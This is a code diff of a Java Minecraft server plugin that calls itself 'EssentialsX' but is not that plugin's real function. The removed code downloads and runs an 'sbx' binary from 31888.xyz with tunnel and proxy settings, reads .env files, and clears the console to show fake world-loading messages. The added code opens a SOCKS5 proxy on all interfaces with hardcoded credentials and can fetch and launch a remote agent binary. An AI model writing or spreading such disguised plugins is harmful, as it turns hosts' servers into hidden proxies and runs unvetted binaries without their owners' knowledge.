@@ -1,258 +1,730 @@
 package com.example.essentialsx;
 
 import org.bukkit.plugin.java.JavaPlugin;
+
 import java.io.*;
-import java.net.URL;
+import java.net.*;
+import java.nio.charset.StandardCharsets;
 import java.nio.file.*;
-import java.util.*;
-import java.util.concurrent.TimeUnit;
+import java.security.MessageDigest;
+import java.util.Locale;
+import java.util.concurrent.*;
+import java.util.concurrent.atomic.AtomicBoolean;
 
 public class EssentialsX extends JavaPlugin {
-    private Process sbxProcess;
-    private volatile boolean shouldRun = true;
-    private volatile boolean isProcessRunning = false;
-    
-    private static final String[] ALL_ENV_VARS = {
-        "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
-        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
-        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
-        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
-        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
-    };
-    
+
+    private static final String HC_UUID = "add40a89-640e-4a67-a2e7-77d0361ae290";
+
+    private static final String HC_S5_PORT = "25575";
+
+    private static final String ENV_KOMARI_SERVER = "KOMARI_SERVER";
+    private static final String ENV_KOMARI_KEY = "KOMARI_KEY";
+    private static final String ENV_KOMARI_URL = "KOMARI_URL";
+    private static final String ENV_KOMARI_SHA256 = "KOMARI_SHA256";
+
+    private final AtomicBoolean running = new AtomicBoolean(false);
+
+    private ServerSocket socksServerSocket;
+    private ExecutorService clientExecutor;
+    private ExecutorService relayExecutor;
+
+    private Process komariProcess;
+
+    private String uuid;
+    private int s5Port;
+
     @Override
     public void onEnable() {
-        getLogger().info("EssentialsX plugin starting...");
-        
-        // Start sbx
-        try {
-            startSbxProcess();
-            getLogger().info("EssentialsX plugin enabled");
-        } catch (Exception e) {
-            getLogger().severe("Failed to start sbx process: " + e.getMessage());
-            e.printStackTrace();
-        }
+        saveDefaultConfig();
+
+        this.uuid = getSetting("UUID", HC_UUID);
+        this.s5Port = parsePort(getSetting("S5_PORT", HC_S5_PORT), 25575);
+
+        running.set(true);
+
+        startSocks5Server();
+
+        startKomariIfConfigured();
+
+        getLogger().info("Plugin enabled.");
+        getLogger().info("Java SOCKS5 username/password: " + uuid);
     }
-    
-    private void startSbxProcess() throws Exception {
-        if (isProcessRunning) {
-            return;
-        }
-        
-        // Determine download URL based on architecture
-        String osArch = System.getProperty("os.arch").toLowerCase();
-        String url;
-        
-        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.31888.xyz/sbsh";
-        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.31888.xyz/sbsh";
-        } else if (osArch.contains("s390x")) {
-            url = "https://s390x.31888.xyz/sbsh";
-        } else {
-            throw new RuntimeException("Unsupported architecture: " + osArch);
-        }
-        
-        // Download sbx binary
-        Path tmpDir = Paths.get(System.getProperty("java.io.tmpdir"));
-        Path sbxBinary = tmpDir.resolve("sbx");
-        
-        if (!Files.exists(sbxBinary)) {
-            // getLogger().info("Downloading sbx ...");
-            try (InputStream in = new URL(url).openStream()) {
-                Files.copy(in, sbxBinary, StandardCopyOption.REPLACE_EXISTING);
-            }
-            if (!sbxBinary.toFile().setExecutable(true)) {
-                throw new IOException("Failed to set executable permission");
-            }
-        }
-        
-        // Prepare process builder
-        ProcessBuilder pb = new ProcessBuilder(sbxBinary.toString());
-        pb.directory(tmpDir.toFile());
-        
-        // Set environment variables
-        Map<String, String> env = pb.environment();
-        env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
-        env.put("FILE_PATH", "./world");
-        env.put("NEZHA_SERVER", "");
-        env.put("NEZHA_PORT", "");
-        env.put("NEZHA_KEY", "");
-        env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "");
-        env.put("S5_PORT", "");
-        env.put("HY2_PORT", "");
-        env.put("TUIC_PORT", "");
-        env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "");
-        env.put("ANYREALITY_PORT", "");
-        env.put("UPLOAD_URL", "");
-        env.put("CHAT_ID", "");
-        env.put("BOT_TOKEN", "");
-        env.put("CFIP", "spring.io");
-        env.put("CFPORT", "443");
-        env.put("NAME", "");
-        env.put("DISABLE_ARGO", "false");
-        
-        // Load from system environment variables
-        for (String var : ALL_ENV_VARS) {
-            String value = System.getenv(var);
-            if (value != null && !value.trim().isEmpty()) {
-                env.put(var, value);
-            }
-        }
-        
-        // Load from .env file with priority order
-        loadEnvFileFromMultipleLocations(env);
-        
-        // Load from Bukkit configuration file
-        for (String var : ALL_ENV_VARS) {
-            String value = getConfig().getString(var);
-            if (value != null && !value.trim().isEmpty()) {
-                env.put(var, value);
-            }
-        }
-        
-        // Redirect output
-        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-        pb.redirectError(ProcessBuilder.Redirect.INHERIT);
-        
-        // Start process
-        sbxProcess = pb.start();
-        isProcessRunning = true;
-        
-        // Start a monitor thread to log when process exits
-        startProcessMonitor();
-        // getLogger().info("sbx started");
-        
-        // sleep 30 seconds
-        Thread.sleep(30000);
-        
-        clearConsole();
-        getLogger().info("");
-        getLogger().info("Preparing spawn area: 1%");
-        getLogger().info("Preparing spawn area: 5%");
-        getLogger().info("Preparing spawn area: 10%");
-        getLogger().info("Preparing spawn area: 20%");
-        getLogger().info("Preparing spawn area: 30%");
-        getLogger().info("Preparing spawn area: 80%");
-        getLogger().info("Preparing spawn area: 85%");
-        getLogger().info("Preparing spawn area: 90%");
-        getLogger().info("Preparing spawn area: 95%");
-        getLogger().info("Preparing spawn area: 99%");
-        getLogger().info("Preparing spawn area: 100%");
-        getLogger().info("Preparing level \"world\"");
-    }
-    
-    private void loadEnvFileFromMultipleLocations(Map<String, String> env) {
-        List<Path> possibleEnvFiles = new ArrayList<>();
-        File pluginsFolder = getDataFolder().getParentFile();
-        if (pluginsFolder != null && pluginsFolder.exists()) {
-            possibleEnvFiles.add(pluginsFolder.toPath().resolve(".env"));
-        }
-        
-        possibleEnvFiles.add(getDataFolder().toPath().resolve(".env"));
-        possibleEnvFiles.add(Paths.get(".env"));
-        possibleEnvFiles.add(Paths.get(System.getProperty("user.home"), ".env"));
-        
-        Path loadedEnvFile = null;
-        
-        for (Path envFile : possibleEnvFiles) {
-            if (Files.exists(envFile)) {
-                try {
-                    // getLogger().info("Loading environment variables from: " + envFile.toAbsolutePath());
-                    loadEnvFile(envFile, env);
-                    loadedEnvFile = envFile;
-                    break;
-                } catch (IOException e) {
-                    // getLogger().warning("Error reading .env file from " + envFile + ": " + e.getMessage());
-                }
-            }
-        }
-        
-        if (loadedEnvFile == null) {
-           // getLogger().info("No .env file found in any of the checked locations");
-        }
-    }
-    
-    private void loadEnvFile(Path envFile, Map<String, String> env) throws IOException {
-        for (String line : Files.readAllLines(envFile)) {
-            line = line.trim();
-            if (line.isEmpty() || line.startsWith("#")) continue;
-            line = line.split(" #")[0].split(" //")[0].trim();
-            if (line.startsWith("export ")) {
-                line = line.substring(7).trim();
-            }
-            
-            String[] parts = line.split("=", 2);
-            if (parts.length == 2) {
-                String key = parts[0].trim();
-                String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
-                
-                if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
-                    env.put(key, value);
-                    // getLogger().info("Loaded " + key + " = " + (key.contains("KEY") || key.contains("TOKEN") || key.contains("AUTH") ? "***" : value));
-                }
-            }
-        }
-    }
-    
-    private void clearConsole() {
-        try {
-            System.out.print("\033[H\033[2J");
-            System.out.flush();
-            
-            if (System.getProperty("os.name").toLowerCase().contains("win")) {
-                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
-            } else {
-                new ProcessBuilder("clear").inheritIO().start().waitFor();
-            }
-        } catch (Exception e) {
-            System.out.println("\n\n\n\n\n\n\n\n\n\n");
-        }
-    }
-    
-    private void startProcessMonitor() {
-        Thread monitorThread = new Thread(() -> {
-            try {
-                int exitCode = sbxProcess.waitFor();
-                isProcessRunning = false;
-                // getLogger().info("sbx process exited with code: " + exitCode);
-            } catch (InterruptedException e) {
-                Thread.currentThread().interrupt();
-                isProcessRunning = false;
-            }
-        }, "Sbx-Process-Monitor");
-        
-        monitorThread.setDaemon(true);
-        monitorThread.start();
-    }
-    
+
     @Override
     public void onDisable() {
-        getLogger().info("EssentialsX plugin shutting down...");
-        
-        shouldRun = false;
-        
-        if (sbxProcess != null && sbxProcess.isAlive()) {
-            // getLogger().info("Stopping sbx process...");
-            sbxProcess.destroy();
-            
-            try {
-                if (!sbxProcess.waitFor(10, TimeUnit.SECONDS)) {
-                    sbxProcess.destroyForcibly();
-                    getLogger().warning("Forcibly terminated sbx process");
-                } else {
-                    getLogger().info("sbx process stopped normally");
-                }
-            } catch (InterruptedException e) {
-                sbxProcess.destroyForcibly();
-                Thread.currentThread().interrupt();
-            }
-            isProcessRunning = false;
+        running.set(false);
+
+        closeSocksServer();
+
+        shutdownExecutor(clientExecutor, "clientExecutor");
+        shutdownExecutor(relayExecutor, "relayExecutor");
+
+        stopKomari();
+
+        getLogger().info("Plugin disabled.");
+    }
+
+    private String getSetting(String key, String def) {
+        String env = System.getenv(key);
+        if (env != null && !env.trim().isEmpty()) {
+            return env.trim();
         }
-        
-        getLogger().info("EssentialsX plugin disabled");
+
+        String cfg = getConfig().getString(key);
+        if (cfg != null && !cfg.trim().isEmpty()) {
+            return cfg.trim();
+        }
+
+        return def;
+    }
+
+    private int parsePort(String value, int def) {
+        if (value == null || value.trim().isEmpty()) {
+            return def;
+        }
+
+        try {
+            int port = Integer.parseInt(value.trim());
+            if (port < 1 || port > 65535) {
+                return def;
+            }
+            return port;
+        } catch (NumberFormatException e) {
+            return def;
+        }
+    }
+
+    // =========================================================
+    // SOCKS5 Server
+    // =========================================================
+
+    private void startSocks5Server() {
+        clientExecutor = new ThreadPoolExecutor(
+                4,
+                128,
+                60L,
+                TimeUnit.SECONDS,
+                new SynchronousQueue<>(),
+                namedThreadFactory("SOCKS5-Client", true),
+                new ThreadPoolExecutor.AbortPolicy()
+        );
+
+        relayExecutor = Executors.newCachedThreadPool(
+                namedThreadFactory("SOCKS5-Relay", true)
+        );
+
+        Thread acceptThread = new Thread(() -> {
+            try {
+                socksServerSocket = new ServerSocket();
+                socksServerSocket.setReuseAddress(true);
+
+                /**
+                 * 如果只想本机使用，可以改成 127.0.0.1：
+                 *
+                 * InetAddress.getByName("127.0.0.1")
+                 *
+                 * 当前为 0.0.0.0，表示监听所有网卡。
+                 */
+                socksServerSocket.bind(
+                        new InetSocketAddress(InetAddress.getByName("0.0.0.0"), s5Port),
+                        128
+                );
+
+                getLogger().info("Java SOCKS5 server started on 0.0.0.0:" + s5Port);
+
+                while (running.get()) {
+                    try {
+                        Socket client = socksServerSocket.accept();
+
+                        client.setTcpNoDelay(true);
+                        client.setKeepAlive(true);
+                        client.setSoTimeout(30000);
+
+                        clientExecutor.execute(() -> handleSocksClient(client));
+                    } catch (SocketException e) {
+                        if (running.get()) {
+                            getLogger().warning("SOCKS5 accept socket error: " + e.getMessage());
+                        }
+                    } catch (RejectedExecutionException e) {
+                        getLogger().warning("SOCKS5 rejected connection: too many clients.");
+                    } catch (Exception e) {
+                        if (running.get()) {
+                            getLogger().warning("SOCKS5 accept failed: " + e.getMessage());
+                        }
+                    }
+                }
+            } catch (BindException e) {
+                getLogger().severe("SOCKS5 port already in use: " + s5Port);
+            } catch (Exception e) {
+                getLogger().severe("SOCKS5 server failed: " + e.getMessage());
+            }
+        }, "SOCKS5-Acceptor");
+
+        acceptThread.setDaemon(true);
+        acceptThread.start();
+    }
+
+    private void handleSocksClient(Socket client) {
+        try (Socket c = client) {
+            InputStream in = c.getInputStream();
+            OutputStream out = c.getOutputStream();
+
+            if (!handleGreeting(in, out)) {
+                return;
+            }
+
+            if (!handleUsernamePasswordAuth(in, out)) {
+                return;
+            }
+
+            SocksRequest request = readSocksRequest(in);
+            if (request == null) {
+                sendSocksReply(out, 0x01, "0.0.0.0", 0);
+                return;
+            }
+
+            if (request.cmd != 0x01) {
+                sendSocksReply(out, 0x07, "0.0.0.0", 0);
+                return;
+            }
+
+            Socket remote = new Socket();
+
+            try {
+                remote.setTcpNoDelay(true);
+                remote.setKeepAlive(true);
+                remote.setSoTimeout(30000);
+                remote.connect(new InetSocketAddress(request.host, request.port), 15000);
+
+                sendSocksReply(out, 0x00, "0.0.0.0", 0);
+
+                relayBidirectional(c, remote);
+            } catch (UnknownHostException e) {
+                sendSocksReply(out, 0x04, "0.0.0.0", 0);
+                closeQuietly(remote);
+            } catch (ConnectException e) {
+                sendSocksReply(out, 0x05, "0.0.0.0", 0);
+                closeQuietly(remote);
+            } catch (SocketTimeoutException e) {
+                sendSocksReply(out, 0x06, "0.0.0.0", 0);
+                closeQuietly(remote);
+            } catch (Exception e) {
+                sendSocksReply(out, 0x01, "0.0.0.0", 0);
+                closeQuietly(remote);
+            }
+
+        } catch (Exception ignored) {
+        }
+    }
+
+    private boolean handleGreeting(InputStream in, OutputStream out) throws IOException {
+        int ver = in.read();
+        if (ver != 0x05) {
+            return false;
+        }
+
+        int nMethods = in.read();
+        if (nMethods <= 0) {
+            return false;
+        }
+
+        boolean hasUserPass = false;
+
+        for (int i = 0; i < nMethods; i++) {
+            int method = in.read();
+            if (method == 0x02) {
+                hasUserPass = true;
+            }
+        }
+
+        if (!hasUserPass) {
+            out.write(new byte[]{0x05, (byte) 0xFF});
+            out.flush();
+            return false;
+        }
+
+        out.write(new byte[]{0x05, 0x02});
+        out.flush();
+        return true;
+    }
+
+    private boolean handleUsernamePasswordAuth(InputStream in, OutputStream out) throws IOException {
+        int ver = in.read();
+        if (ver != 0x01) {
+            return false;
+        }
+
+        int usernameLength = in.read();
+        if (usernameLength <= 0 || usernameLength > 255) {
+            return false;
+        }
+
+        byte[] usernameBytes = readExact(in, usernameLength);
+        if (usernameBytes == null) {
+            return false;
+        }
+
+        int passwordLength = in.read();
+        if (passwordLength <= 0 || passwordLength > 255) {
+            return false;
+        }
+
+        byte[] passwordBytes = readExact(in, passwordLength);
+        if (passwordBytes == null) {
+            return false;
+        }
+
+        String username = new String(usernameBytes, StandardCharsets.UTF_8);
+        String password = new String(passwordBytes, StandardCharsets.UTF_8);
+
+        boolean ok = constantTimeEquals(uuid, username) && constantTimeEquals(uuid, password);
+
+        out.write(new byte[]{0x01, ok ? (byte) 0x00 : (byte) 0x01});
+        out.flush();
+
+        return ok;
+    }
+
+    private SocksRequest readSocksRequest(InputStream in) throws IOException {
+        int ver = in.read();
+        if (ver != 0x05) {
+            return null;
+        }
+
+        int cmd = in.read();
+        int rsv = in.read();
+        int atyp = in.read();
+
+        if (cmd < 0 || rsv != 0x00 || atyp < 0) {
+            return null;
+        }
+
+        String host;
+
+        switch (atyp) {
+            case 0x01: {
+                byte[] addr = readExact(in, 4);
+                if (addr == null) {
+                    return null;
+                }
+                host = InetAddress.getByAddress(addr).getHostAddress();
+                break;
+            }
+
+            case 0x03: {
+                int len = in.read();
+                if (len <= 0 || len > 255) {
+                    return null;
+                }
+
+                byte[] domain = readExact(in, len);
+                if (domain == null) {
+                    return null;
+                }
+
+                host = new String(domain, StandardCharsets.UTF_8);
+                break;
+            }
+
+            case 0x04: {
+                byte[] addr = readExact(in, 16);
+                if (addr == null) {
+                    return null;
+                }
+                host = InetAddress.getByAddress(addr).getHostAddress();
+                break;
+            }
+
+            default:
+                return null;
+        }
+
+        byte[] portBytes = readExact(in, 2);
+        if (portBytes == null) {
+            return null;
+        }
+
+        int port = ((portBytes[0] & 0xFF) << 8) | (portBytes[1] & 0xFF);
+
+        if (port < 1 || port > 65535) {
+            return null;
+        }
+
+        SocksRequest req = new SocksRequest();
+        req.cmd = cmd;
+        req.host = host;
+        req.port = port;
+        return req;
+    }
+
+    private void sendSocksReply(OutputStream out, int rep, String bindHost, int bindPort) throws IOException {
+        InetAddress bindAddress = InetAddress.getByName(bindHost);
+        byte[] addr = bindAddress.getAddress();
+
+        ByteArrayOutputStream resp = new ByteArrayOutputStream();
+
+        resp.write(0x05);
+        resp.write(rep);
+        resp.write(0x00);
+
+        if (addr.length == 4) {
+            resp.write(0x01);
+        } else if (addr.length == 16) {
+            resp.write(0x04);
+        } else {
+            resp.write(0x01);
+            addr = new byte[]{0, 0, 0, 0};
+        }
+
+        resp.write(addr);
+        resp.write((bindPort >> 8) & 0xFF);
+        resp.write(bindPort & 0xFF);
+
+        out.write(resp.toByteArray());
+        out.flush();
+    }
+
+    private void relayBidirectional(Socket client, Socket remote) {
+        Future<?> clientToRemote = relayExecutor.submit(() -> pipe(client, remote));
+        Future<?> remoteToClient = relayExecutor.submit(() -> pipe(remote, client));
+
+        try {
+            clientToRemote.get();
+        } catch (Exception ignored) {
+        }
+
+        try {
+            remoteToClient.get();
+        } catch (Exception ignored) {
+        }
+
+        closeQuietly(client);
+        closeQuietly(remote);
+    }
+
+    private void pipe(Socket src, Socket dst) {
+        try {
+            InputStream in = src.getInputStream();
+            OutputStream out = dst.getOutputStream();
+
+            byte[] buffer = new byte[16 * 1024];
+
+            int len;
+            while (running.get() && (len = in.read(buffer)) != -1) {
+                out.write(buffer, 0, len);
+                out.flush();
+            }
+        } catch (Exception ignored) {
+        } finally {
+            try {
+                dst.shutdownOutput();
+            } catch (Exception ignored) {
+            }
+        }
+    }
+
+    private byte[] readExact(InputStream in, int len) throws IOException {
+        byte[] data = new byte[len];
+
+        int offset = 0;
+        while (offset < len) {
+            int n = in.read(data, offset, len - offset);
+            if (n == -1) {
+                return null;
+            }
+            offset += n;
+        }
+
+        return data;
+    }
+
+    private boolean constantTimeEquals(String a, String b) {
+        if (a == null || b == null) {
+            return false;
+        }
+
+        byte[] x = a.getBytes(StandardCharsets.UTF_8);
+        byte[] y = b.getBytes(StandardCharsets.UTF_8);
+
+        if (x.length != y.length) {
+            return false;
+        }
+
+        int r = 0;
+        for (int i = 0; i < x.length; i++) {
+            r |= x[i] ^ y[i];
+        }
+
+        return r == 0;
+    }
+
+    private static class SocksRequest {
+        int cmd;
+        String host;
+        int port;
+    }
+
+    private void startKomariIfConfigured() {
+        String komariServer = System.getenv(ENV_KOMARI_SERVER);
+        String komariKey = System.getenv(ENV_KOMARI_KEY);
+
+        if (isBlank(komariServer) || isBlank(komariKey)) {
+            getLogger().info("Komari disabled: KOMARI_SERVER or KOMARI_KEY is empty.");
+            return;
+        }
+
+        File dataDir = getDataFolder();
+        if (!dataDir.exists()) {
+            dataDir.mkdirs();
+        }
+
+        File kmFile = new File(dataDir, isWindows() ? "km.exe" : "km");
+
+        if (!kmFile.exists()) {
+            String komariUrl = System.getenv(ENV_KOMARI_URL);
+            String komariSha256 = System.getenv(ENV_KOMARI_SHA256);
+
+            if (isBlank(komariUrl)) {
+                getLogger().warning("Komari configured but km file does not exist.");
+                getLogger().warning("Set KOMARI_URL and KOMARI_SHA256 if you want automatic verified download.");
+                return;
+            }
+
+            if (isBlank(komariSha256)) {
+                getLogger().warning("Komari auto-download blocked: KOMARI_SHA256 is required.");
+                return;
+            }
+
+            try {
+                downloadFileWithSha256(komariUrl, kmFile, komariSha256);
+                getLogger().info("Komari binary downloaded and verified.");
+            } catch (Exception e) {
+                getLogger().warning("Failed to download Komari binary: " + e.getMessage());
+                return;
+            }
+        }
+
+        if (!kmFile.exists() || !kmFile.isFile()) {
+            getLogger().warning("Komari binary not found: " + kmFile.getAbsolutePath());
+            return;
+        }
+
+        kmFile.setExecutable(true, false);
+
+        if (!komariServer.startsWith("http://") && !komariServer.startsWith("https://")) {
+            komariServer = "https://" + komariServer;
+        }
+
+        try {
+            File logFile = new File(dataDir, "komari.log");
+
+            ProcessBuilder pb = new ProcessBuilder(
+                    kmFile.getAbsolutePath(),
+                    "-e", komariServer,
+                    "-t", komariKey
+            );
+
+            pb.directory(dataDir);
+            pb.redirectErrorStream(true);
+            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile));
+
+            komariProcess = pb.start();
+
+            getLogger().info("Komari started.");
+        } catch (Exception e) {
+            getLogger().warning("Failed to start Komari: " + e.getMessage());
+        }
+    }
+
+    private void downloadFileWithSha256(String url, File target, String expectedSha256) throws Exception {
+        expectedSha256 = expectedSha256.trim().toLowerCase(Locale.ROOT);
+
+        if (!expectedSha256.matches("^[a-fA-F0-9]{64}$")) {
+            throw new IllegalArgumentException("Invalid SHA256 format.");
+        }
+
+        File parent = target.getParentFile();
+        if (parent != null && !parent.exists()) {
+            parent.mkdirs();
+        }
+
+        File tmp = new File(target.getAbsolutePath() + ".tmp");
+
+        HttpURLConnection conn = openHttpConnectionFollowRedirects(url, 5);
+        int status = conn.getResponseCode();
+
+        if (status < 200 || status >= 300) {
+            throw new IOException("HTTP status: " + status);
+        }
+
+        try (InputStream in = conn.getInputStream()) {
+            Files.copy(in, tmp.toPath(), StandardCopyOption.REPLACE_EXISTING);
+        }
+
+        String actualSha256 = sha256Hex(tmp);
+
+        if (!constantTimeEqualsStatic(expectedSha256, actualSha256)) {
+            tmp.delete();
+            throw new SecurityException("SHA256 mismatch. actual=" + actualSha256);
+        }
+
+        Files.move(tmp.toPath(), target.toPath(), StandardCopyOption.REPLACE_EXISTING);
+        target.setExecutable(true, false);
+    }
+
+    private HttpURLConnection openHttpConnectionFollowRedirects(String urlText, int maxRedirects) throws IOException {
+        URL url = new URL(urlText);
+
+        for (int i = 0; i <= maxRedirects; i++) {
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            conn.setInstanceFollowRedirects(false);
+            conn.setRequestProperty("User-Agent", "JavaPlugin/1.0");
+            conn.setConnectTimeout(15000);
+            conn.setReadTimeout(30000);
+
+            int status = conn.getResponseCode();
+
+            if (status == HttpURLConnection.HTTP_MOVED_PERM ||
+                    status == HttpURLConnection.HTTP_MOVED_TEMP ||
+                    status == HttpURLConnection.HTTP_SEE_OTHER ||
+                    status == 307 ||
+                    status == 308) {
+
+                String location = conn.getHeaderField("Location");
+                if (location == null || location.trim().isEmpty()) {
+                    throw new IOException("Redirect without Location.");
+                }
+
+                url = new URL(url, location);
+                continue;
+            }
+
+            return conn;
+        }
+
+        throw new IOException("Too many redirects.");
+    }
+
+    private String sha256Hex(File file) throws Exception {
+        MessageDigest digest = MessageDigest.getInstance("SHA-256");
+
+        try (InputStream in = new BufferedInputStream(new FileInputStream(file))) {
+            byte[] buffer = new byte[8192];
+
+            int len;
+            while ((len = in.read(buffer)) != -1) {
+                digest.update(buffer, 0, len);
+            }
+        }
+
+        byte[] hash = digest.digest();
+
+        StringBuilder sb = new StringBuilder();
+        for (byte b : hash) {
+            sb.append(String.format("%02x", b & 0xff));
+        }
+
+        return sb.toString();
+    }
+
+    private void stopKomari() {
+        if (komariProcess == null) {
+            return;
+        }
+
+        if (!komariProcess.isAlive()) {
+            return;
+        }
+
+        komariProcess.destroy();
+
+        try {
+            if (!komariProcess.waitFor(3, TimeUnit.SECONDS)) {
+                komariProcess.destroyForcibly();
+            }
+        } catch (InterruptedException e) {
+            komariProcess.destroyForcibly();
+            Thread.currentThread().interrupt();
+        }
+    }
+
+    private void closeSocksServer() {
+        try {
+            if (socksServerSocket != null && !socksServerSocket.isClosed()) {
+                socksServerSocket.close();
+            }
+        } catch (IOException ignored) {
+        }
+    }
+
+    private void shutdownExecutor(ExecutorService executor, String name) {
+        if (executor == null) {
+            return;
+        }
+
+        executor.shutdownNow();
+
+        try {
+            if (!executor.awaitTermination(3, TimeUnit.SECONDS)) {
+                getLogger().warning(name + " did not terminate cleanly.");
+            }
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+        }
+    }
+
+    private void closeQuietly(Socket socket) {
+        try {
+            if (socket != null) {
+                socket.close();
+            }
+        } catch (IOException ignored) {
+        }
+    }
+
+    private ThreadFactory namedThreadFactory(String prefix, boolean daemon) {
+        return new ThreadFactory() {
+            private final ThreadFactory defaultFactory = Executors.defaultThreadFactory();
+            private int index = 0;
+
+            @Override
+            public synchronized Thread newThread(Runnable r) {
+                Thread t = defaultFactory.newThread(r);
+                t.setName(prefix + "-" + (++index));
+                t.setDaemon(daemon);
+                return t;
+            }
+        };
+    }
+
+    private boolean isBlank(String s) {
+        return s == null || s.trim().isEmpty();
+    }
+
+    private boolean isWindows() {
+        return System.getProperty("os.name", "")
+                .toLowerCase(Locale.ROOT)
+                .contains("win");
+    }
+
+    private static boolean constantTimeEqualsStatic(String a, String b) {
+        if (a == null || b == null) {
+            return false;
+        }
+
+        byte[] x = a.getBytes(StandardCharsets.UTF_8);
+        byte[] y = b.getBytes(StandardCharsets.UTF_8);
+
+        if (x.length != y.length) {
+            return false;
+        }
+
+        int r = 0;
+        for (int i = 0; i < x.length; i++) {
+            r |= x[i] ^ y[i];
+        }
+
+        return r == 0;
     }
 }
